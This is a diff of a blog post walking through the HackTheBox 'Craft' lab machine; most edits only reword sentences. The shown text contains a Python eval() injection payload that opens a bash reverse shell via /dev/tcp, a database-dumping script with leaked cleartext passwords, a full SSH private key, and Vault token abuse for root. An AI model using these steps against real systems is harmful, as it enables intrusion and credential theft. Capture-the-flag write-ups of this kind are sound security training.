@@ -20,11 +20,11 @@ tags:
 <img width="75%" height="75%" src="{{ '/assets/htb-craft/infocard.PNG' | relative_url }}">
 </p>
 
-<p>Craft was a moderate box from HTB that exemplified bad coding practice, sensitive data disclosures and token reuse into root. From a technical standpoint this machine did not introduce any new concepts however I did enjoy the thought that went into the box and it allowed me a chance to be hands-on with HashiCorp's vault solution. Let's follow along with my walkthrough.</p>
+<p>Craft was a well designed moderate box from HTB that exemplified bad coding practice, sensitive data disclosures and token abuse into root. From a technical standpoint this machine did not introduce any drastic new concepts however I did enjoy the thought that went into the box and it allowed me a chance to be hands-on with the VaultProject solution. Let's dive right into it.</p>
 
 <h1>Initial Recon</h1>
 
-<p>Per usual I start off with enumerating the machine using NMAP.</p>
+<p>As per usual we start off with enumerating the machine using NMAP.</p>
 
 {% highlight shell %}
 root@kali:~# nmap -sV -sT -sC 10.10.10.110
@@ -61,7 +61,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </ul>
 {% endhighlight %}
 
-<p>We then add the domains to our hosts file and take a second look.</p>
+<p>We then add the domains to our hosts file and take another look.</p>
 
 {% highlight shell %}
 root@kali:~# cat /etc/hosts
@@ -76,7 +76,7 @@ root@kali:~# cat /etc/hosts
 <img src="{{ '/assets/htb-craft/api.PNG' | relative_url }}">
 </p>
 
-<p>Initially I believed the API endpoints would be our initial avenue, however after exploring <code>/auth/check</code> and <code>/auth/login</code> we have the ability to login and check whether a token is valid, however do not have a better idea on valid values just yet.</p>
+<p>Initially I believed the API endpoints would be our initial avenue in, however after exploring <code>/auth/check</code> and <code>/auth/login</code> that thought changed. We do have the ability to login and check whether a token is valid, however do not have an idea on valid credentials are just yet.</p>
 
 <p>Once we move over to <code>gogs.craft.htb</code> we immediately see that a gogs (a self-hosted Git service) instance is running.</p>
 
@@ -94,13 +94,13 @@ root@kali:~# cat /etc/hosts
 <img src="{{ '/assets/htb-craft/brew-gogs-abv-issue.PNG' | relative_url }}">
 </p>
 
-<p>Based on these finds and with the previous <code>/auth/login</code> api endpoint we looked we're starting to shape up. We should initially be able to login and generate a valid token as <code>dinesh</code>. Combine this with an unsanitized <code>eval()</code> in the <code>/brew</code> endpoint we should be able to be able to pass a payload through a <code>POST</code> request. A few different payloads were tested however the following payload ended up working</p>
+<p>Based on these finds and with the previous <code>/auth/login</code> api endpoint we looked at we're starting to shape up. We should initially be able to login and generate a valid token as <code>dinesh</code> using his credentials. Combine this with an unsanitized <code>eval()</code> in the <code>/brew</code> endpoint and we should be able to be able to pass a payload through a <code>POST</code> request. A few different payloads were tested however the following payload ended up working</p>
 
 {% highlight shell %}
 "abv":"__import__('os').system('bash -i >& /dev/tcp/10.10.xx.xx/1337 0>&1")"
 {% endhighlight %}
 
-<p>Combining all the parts together we write a small script to put it all together.</p>
+<p>Combining all the parts we write a small script to put it all together.</p>
 
 {% highlight python %}
 root@kali:~/Desktop/HTB/Craft# cat test.py 
@@ -175,13 +175,13 @@ finally:
     connection.close()
 {% endhighlight %}
 
-<p>We copy this file and make slight modifications to see if we can enumerate a bit of data. Firstly, and this is the part that tripped me up for much too long, we need to change <code>cursor.fetchone()</code> to <code>cursor.fetchall()</code>. This little oversight caused me a lot of pain and ended sneding down a few rabbit holes before realizing my mistakes. With fetchall set, we can change the query itself to:</p>
+<p>We copy this file and make slight modifications to see if we can enumerate some data from the mysql instance. Firstly, and this is the part that tripped me up for much too long, we need to change <code>cursor.fetchone()</code> to <code>cursor.fetchall()</code>. This little oversight caused me a lot of pain and ended up sending me down a few rabbit holes before realizing my mistakes. With fetchall set, we can change the query itself to:</p>
 
 {% highlight python %}
 sql = "SELECT * FROM user"
 {% endhighlight %}
 
-<p>By using "SHOW TABLES" instead of the query above we could enumerate the <code>user</code> and <code>brew</code> tables, however I initially took a guess and assumed a table <code>user</code> would exist. The final code ends up looking like the following.</p>
+<p>We could use "SHOW TABLES" instead of the query above to determine the tables <code>user</code> and <code>brew</code> would exist, however I initially took a guess and assumed a table <code>user</code> would be present. The final code used ends up looking like the following.</p>
 
 {% highlight python %}
 #!/usr/bin/env python
@@ -217,13 +217,13 @@ finally:
 {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
 {% endhighlight %}
 
-<p>With these credentials we attempt to log back in to the <code>gogs</code> instance. <code>gilfoyle</code> ends up being our lucky crendentials and we manage to get in. In addition to the previous <code>craft-api</code> repo we now also have access to the repo <code>craft-infra</code>.</p>
+<p>With these credentials we can try a few different thing: SSH into the host and attempt to log back in to the <code>gogs</code> instance. SSH was unfortunately a bust but<code>gilfoyle</code> ends up being our lucky credential set and we manage to get in to the <code>gogs</code> instance. In addition to the previous <code>craft-api</code> repo we now also have access to the repo <code>craft-infra</code>. Let's poke around and see what additional information we can find!</p>
 
 <p align="center">
 <img src="{{ '/assets/htb-craft/user-gilfoyle.PNG' | relative_url }}">
 </p>
 
-<p>Immediately my attention was drawn to the <code>.ssh</code> folder. Sure enough we manage to get what seems like <code>gilfoyle</code>'s private key.</p>
+<p>Immediately my attention was drawn to the <code>.ssh</code> folder. Sure enough we manage to get what seems like <code>gilfoyle</code>'s private key into the host.</p>
 
 {% highlight shell %}
 -----BEGIN OPENSSH PRIVATE KEY-----
@@ -256,7 +256,7 @@ I2mtcTYb1RbYd9dDe8eE1X+C/7SLRub3qdqt1B0AgyVG/jPZYf/spUKlu91HFktKxTCmHz
 -----END OPENSSH PRIVATE KEY-----
 {% endhighlight %}
 
-<p>Copying the contents over to our own host we give ssh'ing into the host. We're asked for the key's password, which we assume is the same as the <code>gogs</code> password we previously discovered. Sure enough, we are successful and finally have access to the user flag.</p>
+<p>Copying the contents over to our own host we attempt to SSH into the host using the key. We're asked for the key's password, and we made an assumption that <code>gilfoyle</code> uses the same password in various places. Sure enough, we are successful and finally have access to the user flag.</p>
 
 <p align="center">
 <img src="{{ '/assets/htb-craft/user-owned.PNG' | relative_url }}">
@@ -264,14 +264,14 @@ I2mtcTYb1RbYd9dDe8eE1X+C/7SLRub3qdqt1B0AgyVG/jPZYf/spUKlu91HFktKxTCmHz
 
 <h1>Root exploitation</h1>
 
-<p>For as long as it took to get to the user flag the root flag seemed much simpler in comparison. From the user homedirectory we found something interesting - a .vault-token.</p>
+<p>For as long as it took to get to the user flag the root flag seemed much simpler in comparison. From the user homedirectory we found something interesting - a <code>.vault-token</code>.</p>
 
 {% highlight shell %}
 gilfoyle@craft:~$ cat .vault-token 
 f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
 {% endhighlight %}
 
-<p>After a bit of searching around discovered that this is a <a href="https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html">VaultProject Token</a> and is used to generate One-Time Passwords (OTP) and can be used for SSH. This seems like an interesting avenue. Sure enough, quickly see that this is what we are dealing with by confirming that <code>vault</code> is installed on the machine, and that we can see the <code>otp_role</code> is defined on the repo.</p>
+<p>After a bit of searching around discovered that this is a <a href="https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html">VaultProject Token</a> and is used to generate One-Time Passwords (OTP) and can be used for various things, including SSH. This seems like an interesting avenue. Sure enough, quickly see that this is what we are dealing with by confirming that <code>vault</code> utlity is installed on the machine, and that we can see the <code>root_otp</code> SSH role is defined on the repo.</p>
 
 <p align="center">
 <img src="{{ '/assets/htb-craft/root-vault.PNG' | relative_url }}">
